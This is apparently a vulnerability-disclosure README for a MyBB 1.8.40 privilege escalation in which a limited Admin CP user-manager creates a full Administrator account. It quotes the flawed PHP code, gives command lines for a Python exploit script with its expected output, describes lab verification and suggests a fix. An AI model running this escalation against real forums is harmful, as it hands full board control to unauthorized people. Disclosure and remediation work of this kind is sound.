# MyBB 1.8.40 Limited ACP User Manager to Full Administrator

This repository contains a portable proof of concept for a MyBB 1.8.40 Admin CP privilege-boundary issue.

A non-super Admin CP account with only the user-management module permission can create a new user in the Administrator group (`gid=4`). The created account inherits full Administrator-group Admin CP permissions, including access to modules the source account was explicitly denied.

## Status

- Target verified: MyBB `1.8.40` / version code `1840`
- Latest release confirmed: MyBB 1.8.40, released 28 May 2026
- Live test date: 18 June 2026
- PoC language: Python 3 standard library only

The older regular-user buddy/ignore-list username XSS chain is patched in 1.8.40 as CVE-2026-45115. This repo is for a different latest-version issue: limited ACP user-management privilege escalation to full Administrator.

## Impact

The final impact is full MyBB application administration:

- Read and modify board configuration.
- Create, edit, ban, or delete users.
- Access forum data exposed through the Admin CP.
- Change content, permissions, settings, themes, templates, and persistence mechanisms available to Administrators.

This has the same final application-root impact as the earlier stored-XSS-to-Admin-CP chain, but the precondition is different and stricter: the attacker needs access to an ACP account that can manage users.

## Preconditions

The source account must:

- Be authenticated to the Admin CP.
- Have `user-users = 1` permission.
- Not need to be a super administrator.
- Not need `user-admin_permissions = 1`.
- Not need access to unrelated Admin CP modules such as Configuration, Templates, Tools, or Forums.

## Root Cause

The Admin CP add-user flow forwards submitted group fields directly into the user data handler:

```php
"usergroup" => $mybb->get_input('usergroup'),
"additionalgroups" => $additionalgroups,
"displaygroup" => $mybb->get_input('displaygroup'),
```

The add-user form renders every non-guest user group, including `gid=4` Administrator:

```php
$query = $db->simple_select("usergroups", "gid, title", "gid != '1'", array('order_by' => 'title'));
```

The user data handler still accepts group choices unconditionally:

```php
function verify_usergroup()
{
    return true;
}
```

There is no effective authorization check that the acting ACP user is allowed to grant an ACP-capable group.

## Usage

Use only on systems you own or are explicitly authorized to test.

With limited ACP credentials:

```bash
python3 poc/mybb_limited_acp_to_admin.py \
  --url http://127.0.0.1:8110 \
  --admin-user limited_user_manager \
  --admin-pass 'LimitedPassword123!' \
  --new-user promoted_admin \
  --new-pass 'NewAdminPassword123!' \
  --new-email promoted_admin@example.test
```

With an existing limited ACP `adminsid` cookie:

```bash
python3 poc/mybb_limited_acp_to_admin.py \
  --url https://forum.example.test \
  --adminsid '<limited-adminsid-cookie>' \
  --new-user promoted_admin \
  --new-pass 'NewAdminPassword123!' \
  --new-email promoted_admin@example.test
```

For local labs using self-signed TLS, add `--no-verify-tls`.

## Expected Output

The PoC verifies the boundary crossing by comparing access to an Admin CP module before and after creating the new account:

```text
target              : http://127.0.0.1:8110
source_probe_status : HTTP 200
source_probe_denied : yes
add_form_status     : HTTP 200
post_key_found      : yes
create_status       : HTTP 200
new_admin_login     : adminsid issued
new_probe_status    : HTTP 200
new_probe_denied    : no

Result: full Administrator account created and verified
```

`source_probe_denied=yes` and `new_probe_denied=no` show that the source account lacked the tested permission while the newly created gid-4 account gained it.

## Live Verification Performed

I verified this against a fresh 1.8.40 install:

- Downloaded `mybb_1840.zip` from MyBB resources.
- Verified SHA-256: `380fb63c50c63f52c747ba05d1002ad77f2f0b1d254db213092501dd5e9375dc`.
- Installed through the official installer using SQLite.
- Confirmed code version from `inc/class_core.php`: `1.8.40 (1840)`.
- Seeded a non-super ACP account with only `user-users = 1`.
- Confirmed that account received `Access Denied` for `config-settings`.
- Used the Admin CP add-user form to create a new `gid=4` Administrator.
- Logged in as the new account and confirmed `config-settings` was no longer denied.

The Python PoC was also run against the live lab and produced the expected verified output above.

## Patched Prior Chain

The previous MyBB 1.8.39 buddy-selector stored XSS relied on stock templates passing attacker-controlled username data into a single-quoted inline JavaScript call:

```html
onclick="UserCP.selectBuddy('{$buddy['uid']}', '{$buddy['username']}');"
```

In stock MyBB 1.8.40, the affected templates now call `UserCP.selectBuddy()` without the username argument:

```html
onclick="UserCP.selectBuddy();"
```

That removes the old username-to-inline-JS sink in the default template set.

## Suggested Fix

When an ACP user creates or edits accounts, reject any primary, additional, or display group with Admin CP capability unless the acting user is a super administrator or has an explicit high-trust permission to grant ACP-capable groups.

Concrete checks should cover:

- Add-user flow.
- Edit-user flow.
- Inline/mass usergroup update flow.
- Any plugin hooks or alternate paths that call the user data handler with group fields.

Defense-in-depth: make `UserDataHandler::verify_usergroup()` enforce group grant rules instead of returning `true`.

## References

- [MyBB 1.8.40 version page](https://mybb.com/versions/1.8.40/)
- [MyBB 1.8.40 release announcement](https://blog.mybb.com/2026/05/28/mybb-1-8-40-released-security-maintenance-release/)
- [MyBB releases on GitHub](https://github.com/mybb/mybb/releases)

## Responsible Use

This PoC is for authorized security testing, regression verification, and defensive remediation. Do not use it against systems without permission.
